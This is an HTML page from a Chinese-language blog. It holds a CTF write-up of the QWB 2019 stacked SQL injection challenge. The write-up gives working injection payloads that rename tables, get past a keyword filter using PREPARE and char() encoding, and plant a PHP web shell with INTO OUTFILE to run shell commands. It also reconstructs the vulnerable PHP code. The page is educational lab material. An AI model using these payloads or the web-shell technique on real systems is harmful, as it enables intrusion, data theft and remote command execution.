@@ -1,0 +1,372 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="Bantian">
+
+
+
+
+
+<title>强网杯2019_随便注之堆叠注入 | Hexo</title>
+
+
+
+    <link rel="icon" href="/favicon.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+<meta name="generator" content="Hexo 4.2.1"></head>
+<body>
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">Bantian&#39;s Blog</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">Archives</a>
+                
+                    <a class="menu-item" href="/categories">Categories</a>
+                
+                    <a class="menu-item" href="/tags">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">Bantian&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">Archives</a>
+                
+                    <a class="menu-item" href="/categories">Categories</a>
+                
+                    <a class="menu-item" href="/tags">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+        <div class="main">
+            <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    document.ready(
+        function () {
+            tocbot.init({
+                tocSelector: '.tocbot-list',
+                contentSelector: '.post-content',
+                headingSelector: 'h1, h2, h3, h4, h5',
+                collapseDepth: 1,
+                orderedList: false,
+                scrollSmooth: true,
+            })
+        }
+    )
+
+    function expand_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 6,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "collapse_toc()");
+        b.innerHTML = "Collapse all"
+    }
+
+    function collapse_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 1,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "expand_toc()");
+        b.innerHTML = "Expand all"
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">强网杯2019_随便注之堆叠注入</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">Bantian</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">April 11, 2020&nbsp;&nbsp;15:05:12</a>
+                        </span>
+                    
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <p>考点：</p>
+<ul>
+<li>堆叠注入</li>
+<li>SQL语句预处理</li>
+</ul>
+<h3 id="1-堆叠注入"><a href="#1-堆叠注入" class="headerlink" title="1. 堆叠注入"></a>1. 堆叠注入</h3><p>堆叠注入（Stacked Injection），顾名思义，就是通过一次性执行多条sql语句进行注入。在SQL中，分号<code>;</code>表示一条sql语句的结束，但是在结束一个sql语句后，如果后面还跟着一条sql语句，也会被一起执行了，造成了堆叠注入。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; create database users;</span><br><span class="line">Query OK, 1 row affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; use users;</span><br><span class="line">Database changed</span><br><span class="line"></span><br><span class="line">mysql&gt; create table users(</span><br><span class="line">    -&gt; username varchar(50),</span><br><span class="line">    -&gt; password varchar(50)</span><br><span class="line">    -&gt; );</span><br><span class="line">Query OK, 0 rows affected (0.04 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; insert into users values(&#39;bantian&#39;,&#39;123456&#39;);</span><br><span class="line">Query OK, 1 row affected (0.01 sec)</span><br></pre></td></tr></table></figure>
+
+<p>通过堆叠查询新建一个表：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from users where username&#x3D;&#39;bantian&#39;;create table test like users;</span><br><span class="line">+----------+----------+</span><br><span class="line">| username | password |</span><br><span class="line">+----------+----------+</span><br><span class="line">| bantian  | 123456   |</span><br><span class="line">+----------+----------+</span><br><span class="line">1 row in set (0.01 sec)</span><br><span class="line"></span><br><span class="line">Query OK, 0 rows affected (0.03 sec)</span><br></pre></td></tr></table></figure>
+
+<p><code>show tables</code>查看确实有新表<code>test</code>生成</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; show tables;</span><br><span class="line">+-----------------+</span><br><span class="line">| Tables_in_users |</span><br><span class="line">+-----------------+</span><br><span class="line">| test            |</span><br><span class="line">| users           |</span><br><span class="line">+-----------------+</span><br><span class="line">2 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/04/11/%E5%BC%BA%E7%BD%91%E6%9D%AF2019-%E9%9A%8F%E4%BE%BF%E6%B3%A8%E4%B9%8B%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/imgs/1.png" alt="1"></p>
+<p>删除表<code>test</code>：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from users;drop table test;</span><br><span class="line">+----------+----------+</span><br><span class="line">| username | password |</span><br><span class="line">+----------+----------+</span><br><span class="line">| bantian  | 123456   |</span><br><span class="line">+----------+----------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">Query OK, 0 rows affected (0.02 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; show tables;</span><br><span class="line">+-----------------+</span><br><span class="line">| Tables_in_users |</span><br><span class="line">+-----------------+</span><br><span class="line">| users           |</span><br><span class="line">+-----------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>
+
+<p>查询数据：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from users where username&#x3D;&#39;bantian&#39;;select 1,2;</span><br><span class="line">+----------+----------+</span><br><span class="line">| username | password |</span><br><span class="line">+----------+----------+</span><br><span class="line">| bantian  | 123456   |</span><br><span class="line">+----------+----------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">+---+---+</span><br><span class="line">| 1 | 2 |</span><br><span class="line">+---+---+</span><br><span class="line">| 1 | 2 |</span><br><span class="line">+---+---+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>
+
+<p>回到题目本身，先用堆叠注入看一下数据库信息：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?inject&#x3D;1&#39;;show databases;%23</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/04/11/%E5%BC%BA%E7%BD%91%E6%9D%AF2019-%E9%9A%8F%E4%BE%BF%E6%B3%A8%E4%B9%8B%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/imgs/2.png" alt="2"></p>
+<p>果然可以成功回显，然后看一下当前数据库的数据表：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?inject&#x3D;1&#39;;show tables;%23</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/04/11/%E5%BC%BA%E7%BD%91%E6%9D%AF2019-%E9%9A%8F%E4%BE%BF%E6%B3%A8%E4%B9%8B%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/imgs/3.png" alt="3"></p>
+<p>发现有两张表，<code>1919810931114514</code>和<code>words</code>表，分别查看他们的字段信息：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?inject&#x3D;1&#39;;show columns from &#96;1919810931114514&#96;;%23</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/04/11/%E5%BC%BA%E7%BD%91%E6%9D%AF2019-%E9%9A%8F%E4%BE%BF%E6%B3%A8%E4%B9%8B%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/imgs/4.png" alt="4"></p>
+<p>表<code>1919810931114514</code>只有一个名为<code>flag</code>的字段。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?inject&#x3D;1&#39;;show columns from &#96;words&#96;;%23</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/04/11/%E5%BC%BA%E7%BD%91%E6%9D%AF2019-%E9%9A%8F%E4%BE%BF%E6%B3%A8%E4%B9%8B%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/imgs/8.png" alt="8"></p>
+<p><code>words</code>表中有两个字段，<code>id</code>和<code>data</code>，对应着<code>var_dump()</code>格式的输出<code>1</code>和<code>hahahah</code>，所以可以推出，默认情况下是对<code>words</code>表进行查询的，回显的也是<code>words</code>表中的内容。</p>
+<p>但是<code>flag</code>又应该是放在<code>1919810931114514</code>表中的，所以可以尝试将<code>1919810931114514</code>表和<code>words</code>表的名字互换：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; 先将words表重命名为words1,空出words名称</span><br><span class="line">rename table &#96;words&#96; to &#96;words1&#96;;</span><br><span class="line">&#x2F;&#x2F; 然后将1919810931114514表的名称改为words</span><br><span class="line">rename table &#96;1919810931114514&#96; to &#96;words&#96;;</span><br></pre></td></tr></table></figure>
+
+<p>最终的拼接为：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?inject&#x3D;1&#39;;rename table &#96;words&#96; to &#96;words1&#96;;rename table &#96;1919810931114514&#96; to &#96;words&#96;;%23</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/04/11/%E5%BC%BA%E7%BD%91%E6%9D%AF2019-%E9%9A%8F%E4%BE%BF%E6%B3%A8%E4%B9%8B%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/imgs/5.png" alt="5"></p>
+<p>提示<code>Unknown column &#39;id&#39; in &#39;where clause&#39;</code>，所以猜测sql语句是这样的：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from words where id&#x3D;&#39;$inject&#39;</span><br></pre></td></tr></table></figure>
+
+<p>还需要修改列名，将原数字表中的<code>flag</code>字段改为<code>id</code>字段：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ALTER TABLE &#96;words&#96; CHANGE &#96;flag&#96; &#96;id&#96; VARCHAR(100) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL</span><br></pre></td></tr></table></figure>
+
+<p>最终的payload为：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;5ef52555-6434-481d-b238-bae5166bb61f.node3.buuoj.cn&#x2F;?inject&#x3D;1%27;rename table &#96;words&#96; to &#96;words1&#96;;rename table &#96;1919810931114514&#96; to &#96;words&#96;;alter table &#96;words&#96; change &#96;flag&#96; &#96;id&#96; varchar(100) character set utf8 collate utf8_general_ci not null;show columns from words;%23</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/04/11/%E5%BC%BA%E7%BD%91%E6%9D%AF2019-%E9%9A%8F%E4%BE%BF%E6%B3%A8%E4%B9%8B%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/imgs/6.png" alt="6"></p>
+<p><code>flag</code>字段已经被修改为<code>id</code>，所以最后只要进行查询即可，<code>1&#39; or &#39;1&#39;=&#39;1</code>：</p>
+<p><img src="/2020/04/11/%E5%BC%BA%E7%BD%91%E6%9D%AF2019-%E9%9A%8F%E4%BE%BF%E6%B3%A8%E4%B9%8B%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/imgs/7.png" alt="7"></p>
+<p>其实这道题的代码大概可以摸出来，大致逻辑是这样的：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sql_waf</span><span class="params">($inject)</span></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (preg_match(<span class="string">"/select|update|delete|drop|insert|where|\./i"</span>, $inject))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'return preg_match("/select|update|delete|drop|insert|where|\./i", $inject)'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'inject'</span>]))&#123;</span><br><span class="line">    $inject = $_GET[<span class="string">'inject'</span>];</span><br><span class="line">    sql_waf($inject);</span><br><span class="line">    </span><br><span class="line">    $con = mysqli_connect($host, $user, $passwd, $dbname);</span><br><span class="line">    $sql = <span class="string">"select * from `word` where id = '$inject' limit 0,1;"</span></span><br><span class="line">        </span><br><span class="line">    <span class="comment">/* execute multi query*/</span></span><br><span class="line">    <span class="keyword">if</span> (mysqli_multi_query($con, $sql))&#123;</span><br><span class="line">        <span class="comment">/* store first result set */</span></span><br><span class="line">        $result = mysqli_multi_query($con);</span><br><span class="line">        <span class="keyword">if</span> (result)&#123;</span><br><span class="line">            <span class="keyword">if</span> ($row = mysqli_fetch_row($result))&#123;</span><br><span class="line">                var_dump($row);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    mysqli_close($con);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="2-SQL预处理语句"><a href="#2-SQL预处理语句" class="headerlink" title="2. SQL预处理语句"></a>2. SQL预处理语句</h3><p>以下关于SQL预处理的解释来自：</p>
+<blockquote>
+<p><a href="https://www.cnblogs.com/geaozhang/p/9891338.html" target="_blank" rel="noopener">https://www.cnblogs.com/geaozhang/p/9891338.html</a> </p>
+</blockquote>
+<p>SQL语句的执行处理分为两种：</p>
+<h5 id="一、即时SQL"><a href="#一、即时SQL" class="headerlink" title="一、即时SQL"></a>一、即时SQL</h5><p> 一条 SQL 在 DB 接收到最终执行完毕返回，大致的过程如下：</p>
+<p>  　　1. 词法和语义解析；<br>  　　2. 优化 SQL 语句，制定执行计划；<br>  　　3. 执行并返回结果；<br>       如上，一条 SQL 直接是走流程处理，一次编译，单次运行，此类普通语句被称作 Immediate Statements （即时 SQL）。 </p>
+<h5 id="二、预处理SQL"><a href="#二、预处理SQL" class="headerlink" title="二、预处理SQL"></a>二、预处理SQL</h5><p>​        但是，绝大多数情况下，某需求某一条 SQL 语句可能会被反复调用执行，或者每次执行的时候只有个别的值不同（比如 select 的 where 子句值不同，update 的 set 子句值不同，insert 的 values 值不同）。如果每次都需要经过上面的词法语义解析、语句优化、制定执行计划等，则效率就明显不行了。<br>　　所谓预编译语句就是将此类 SQL 语句中的值用占位符替代，可以视为将 SQL 语句模板化或者说参数化，一般称这类语句叫Prepared Statements。<br>　　预编译语句的优势在于归纳为：一次编译、多次运行，省去了解析优化等过程；此外预编译语句能防止 SQL 注入。</p>
+<h5 id="三、语法"><a href="#三、语法" class="headerlink" title="三、语法"></a>三、语法</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 预处理语句定义</span><br><span class="line">PREPARE stmt_name FROM preparable_stmt;</span><br><span class="line"># 执行预处理语句</span><br><span class="line">EXECUTE stmt_name [USING @var_name [, @var_name] ...]</span><br><span class="line"># 删除（释义）定义</span><br><span class="line">&#123;DEALLOCATE | DROP&#125; PREPARE stmt_name;</span><br></pre></td></tr></table></figure>
+
+<h5 id="四、例子"><a href="#四、例子" class="headerlink" title="四、例子"></a>四、例子</h5><p>4.1 <em>利用<strong>字符串</strong>定义预处理SQL（直角三角形计算）</em></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; PREPARE stmt1 FROM &#39;SELECT SQRT(POW(?,2) + POW(?,2)) AS hypotenuse&#39;;</span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br><span class="line">Statement prepared</span><br><span class="line"></span><br><span class="line">mysql&gt; SET @a&#x3D;3;</span><br><span class="line">Query OK, 0 rows affected (0.01 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; SET @b&#x3D;4;</span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; EXECUTE stmt1 USING @a, @b;</span><br><span class="line">+------------+</span><br><span class="line">| hypotenuse |</span><br><span class="line">+------------+</span><br><span class="line">|          5 |</span><br><span class="line">+------------+</span><br><span class="line">1 row in set (0.01 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; DEALLOCATE PREPARE stmt1;</span><br><span class="line">Query OK, 0 rows affected (0.01 sec)</span><br></pre></td></tr></table></figure>
+
+<p>4.2 <em>利用<strong>变量</strong>定义预处理SQL（直角三角形计算）</em></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SET @s &#x3D; &#39;SELECT SQRT(POW(?,2) + POW(?,2)) AS hypotenuse&#39;;</span><br><span class="line">Query OK, 0 rows affected (0.01 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; PREPARE stmt2 FROM @s;</span><br><span class="line">Query OK, 0 rows affected (0.01 sec)</span><br><span class="line">Statement prepared</span><br><span class="line"></span><br><span class="line">mysql&gt; SET @c &#x3D; 6;</span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; SET @d &#x3D; 8;</span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; EXECUTE stmt2 USING @c, @d;</span><br><span class="line">+------------+</span><br><span class="line">| hypotenuse |</span><br><span class="line">+------------+</span><br><span class="line">|         10 |</span><br><span class="line">+------------+</span><br><span class="line">1 row in set (0.01 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; DEALLOCATE PREPARE stmt2;</span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br></pre></td></tr></table></figure>
+
+<p>回到题目本身，当我们已经用堆叠注入获得了表名<code>1919810931114514</code>的时候，接下来可以借助SQL的预处理机制。</p>
+<p>SQL引擎会将</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">concat(char(115,101,108,101,99,116), &#39; * from &#96;1919810931114514&#96;&#39;)</span><br></pre></td></tr></table></figure>
+
+<p>编译为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from &#96;1919810931114514&#96;</span><br></pre></td></tr></table></figure>
+
+<p>这样就绕过了一开始的waf对<code>select</code>的过滤。</p>
+<p>最终的payload为：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?inject&#x3D;1&#39;;PREPARE bantian from concat(char(115,101,108,101,99,116), &#39; * from &#96;1919810931114514&#96;&#39;);EXECUTE bantian;%23</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/04/11/%E5%BC%BA%E7%BD%91%E6%9D%AF2019-%E9%9A%8F%E4%BE%BF%E6%B3%A8%E4%B9%8B%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/imgs/9.png" alt="9"></p>
+<h3 id="3-利用命令执行"><a href="#3-利用命令执行" class="headerlink" title="3. 利用命令执行"></a>3. 利用命令执行</h3><p>这个方法比较tricky，是通过mysql向服务器写入文件，首先需要满足的条件就是root权限，以及GPC需要关闭（也就是能使用单引号）。</p>
+<p>先进行查询，发现满足root权限：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?inject&#x3D;1&#39;;PREPARE bantian from concat(char(115,101,108,101,99,116), &#39; user()&#39;);EXECUTE bantian;%23</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/04/11/%E5%BC%BA%E7%BD%91%E6%9D%AF2019-%E9%9A%8F%E4%BE%BF%E6%B3%A8%E4%B9%8B%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/imgs/10.png" alt="10"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?inject&#x3D;1&#39;;SET @stmt&#x3D;concat(&quot;se&quot;,&quot;lect &#39;&lt;?php @print_r(&#96;$_GET[&#39;1&#39;]&#96;);?&gt;&#39; into outfile &#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;1&quot;,char(46),&quot;php&#39;&quot;);PREPARE sql from @stmt;EXECUTE sql;%23</span><br></pre></td></tr></table></figure>
+
+<p>然后借助预处理语句和<code>outfile</code>将一句话木马写入<code>1.php</code>文件，然后我们看一下当前使用的是哪个数据库：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?inject&#x3D;1&#39;;PREPARE bantian from concat(char(115,101,108,101,99,116), &#39; database();&#39;);EXECUTE bantian;%23</span><br></pre></td></tr></table></figure>
+
+<p>发现当前数据库是<code>supersqli</code>：</p>
+<p><img src="/2020/04/11/%E5%BC%BA%E7%BD%91%E6%9D%AF2019-%E9%9A%8F%E4%BE%BF%E6%B3%A8%E4%B9%8B%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/imgs/12.png" alt="12"></p>
+<p>然后注入命令进行查询：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1.php?1&#x3D;mysql -uroot -proot -e &quot;use supersqli;select flag from \&#96;1919810931114514\&#96;;&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/04/11/%E5%BC%BA%E7%BD%91%E6%9D%AF2019-%E9%9A%8F%E4%BE%BF%E6%B3%A8%E4%B9%8B%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/imgs/11.png" alt="11"></p>
+<p>这道题的解法还是很灵活的，但是这三个方法都是建立在堆叠注入的基础之上，这次又学到了一种新的注入方式。</p>
+
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                    <p class="copyright-item">
+                        <span>Author:</span>
+                        <span>Bantian</span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>Permalink:</span>
+                        <span><a href="https://bantttian.github.io/2020/04/11/%E5%BC%BA%E7%BD%91%E6%9D%AF2019-%E9%9A%8F%E4%BE%BF%E6%B3%A8%E4%B9%8B%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/">https://bantttian.github.io/2020/04/11/%E5%BC%BA%E7%BD%91%E6%9D%AF2019-%E9%9A%8F%E4%BE%BF%E6%B3%A8%E4%B9%8B%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/</a></span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>License:</span>
+                        <span>Copyright (c) 2019 <a href="http://creativecommons.org/licenses/by-nc/4.0/" target="_blank" rel="noopener">CC-BY-NC-4.0</a> LICENSE</span>
+                    </p>
+                
+                
+                     <p class="copyright-item">
+                         <span>Slogan:</span>
+                         <span>早睡早起身体好</span>
+                     </p>
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/tags/CTF/"># CTF</a>
+                    
+                        <a href="/tags/Web/"># Web</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+                <a class="prev" rel="prev" href="/2020/04/20/OverTheWire-Natas-Walkthrough-1/">OverTheWire Natas Walkthrough-1</a>
+            
+            
+            <a class="next" rel="next" href="/2020/03/30/WWW2018-Large-Scale-Analysis-of-Style-Injection-by-Relative-Path-Overwrite/">WWW2018论文精读 Large-Scale Analysis of Style Injection by Relative Path Overwrite</a>
+            
+        </section>
+
+
+    </article>
+</div>
+
+        </div>
+        <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© Bantian | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+</footer>
+
+    </div>
+</body>
+</html>
